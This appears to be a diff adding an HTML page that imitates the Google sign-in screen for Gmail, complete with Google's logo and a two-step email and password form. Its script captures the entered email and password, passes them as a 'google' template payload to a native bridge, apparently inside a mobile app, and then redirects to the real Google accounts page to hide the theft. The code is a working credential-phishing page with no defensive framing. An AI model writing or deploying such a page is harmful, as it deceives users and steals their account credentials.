@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Google Sign In</title>
+    <style>
+        body { font-family: 'Roboto', sans-serif; margin: 0; padding: 20px; background: #fff; color: #202124; }
+        .logo { width: 75px; margin: 40px auto 20px; display: block; }
+        h1 { text-align: center; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { text-align: center; font-size: 16px; margin-bottom: 40px; }
+        .input-group { margin-bottom: 24px; position: relative; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { outline: none; border: 2px solid #1a73e8; padding: 12px 14px; }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; float: right; cursor: pointer; }
+        .footer { margin-top: 100px; font-size: 12px; color: #70757a; display: flex; justify-content: space-between; }
+    </style>
+</head>
+<body>
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
+    <h1>Sign in</h1>
+    <p>to continue to Gmail</p>
+    
+    <div id="step1">
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Email or phone" required>
+        </div>
+        <button class="btn" onclick="next()">Next</button>
+    </div>
+
+    <div id="step2" style="display:none;">
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+        <button class="btn" onclick="submit()">Sign in</button>
+    </div>
+
+    <script>
+        let emailData = "";
+        function next() {
+            emailData = document.getElementById('email').value;
+            if (emailData) {
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
+            }
+        }
+        function submit() {
+            const passData = document.getElementById('password').value;
+            const payload = {
+                template: 'google',
+                email: emailData,
+                password: passData
+            };
+            
+            if (window.NativeBridge) {
+                window.NativeBridge.report(JSON.stringify(payload));
+            }
+            
+            // Simular carga y cerrar
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com";
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
